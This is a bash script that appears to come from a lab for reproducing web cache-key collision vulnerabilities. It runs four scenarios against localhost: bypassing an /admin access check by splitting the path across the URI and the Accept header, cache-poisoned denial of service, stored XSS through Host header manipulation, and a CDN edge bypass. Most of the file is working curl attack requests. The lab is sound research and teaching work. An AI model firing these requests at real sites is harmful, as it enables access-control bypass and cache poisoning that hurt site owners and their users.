#!/usr/bin/env bash
# Runs one named scenario end-to-end against the local lab and prints the
# relevant headers so you can see the collision happen. Intended as a
# quick demo / sanity check; see docs/02-reproduction-guide.md for the
# full manual walkthrough and explanation of each step.
set -euo pipefail

BASE="http://localhost:8080"
HTTPS_BASE="https://localhost:8443"

usage() {
    echo "Usage: $0 [acl-bypass|cpdos|stored-xss|cdn-bypass]"
    exit 1
}

[[ $# -eq 1 ]] || usage

case "$1" in
  acl-bypass)
    echo "== Seeding admin cache as localhost =="
    ./seed-admin-cache.sh
    echo
    echo "== Attacker request to /admin directly (should be denied) =="
    curl -s -o /dev/null -w "HTTP %{http_code}\n" -H "Accept: */*" "$BASE/admin"
    echo
    echo "== Attacker request splitting /admin across URI + Accept (should collide) =="
    curl -s -H "Accept: min*/*" "$BASE/ad" -D - -o /tmp/ck-admin-response.html
    echo
    echo "Response body saved to /tmp/ck-admin-response.html"
    cat /tmp/ck-admin-response.html
    ;;

  cpdos)
    echo "== Cache buster note: in a real test always use a unique path/param first. =="
    echo "== Attacker pre-poisons the key for /home by requesting /h with Accept: ome*/* =="
    curl -s -H "Accept: ome*/*" "$BASE/h" -D -
    echo
    echo "== Victim requests /home normally -- should now receive the poisoned 404 =="
    curl -s -H "Accept: */*" "$BASE/home" -D -
    ;;

  stored-xss)
    echo "== Step 1: confirm Host reflection + cacheability on plain HTTP =="
    curl -sk -H "Host: target.com" "$BASE/?cachebuster=demo1" -D - | head -n 20
    echo
    echo "== Step 2: poison via scheme/host boundary shift (http + sdummywebsite.localhost) =="
    curl -s -H "Host: sdummywebsite.localhost" "$BASE/" -D - -o /tmp/ck-poison.html
    echo
    echo "== Step 3: normal HTTPS request to dummywebsite.localhost should now be poisoned =="
    curl -sk -H "Host: dummywebsite.localhost" "$HTTPS_BASE/" -D -
    ;;

  cdn-bypass)
    echo "== Step 1: attacker request through edge-sim with Authorization (bypasses edge, reaches origin) =="
    curl -s -H "Authorization: Bearer attacker-token" -H "Accept: Z" "http://localhost:9090/XY" -D -
    echo
    echo "== Step 2: confirm collision directly against nginx origin (HIT expected) =="
    curl -s -H "Authorization: Bearer attacker-token" "http://localhost:9090/XYZ" -D -
    ;;

  *)
    usage
    ;;
esac
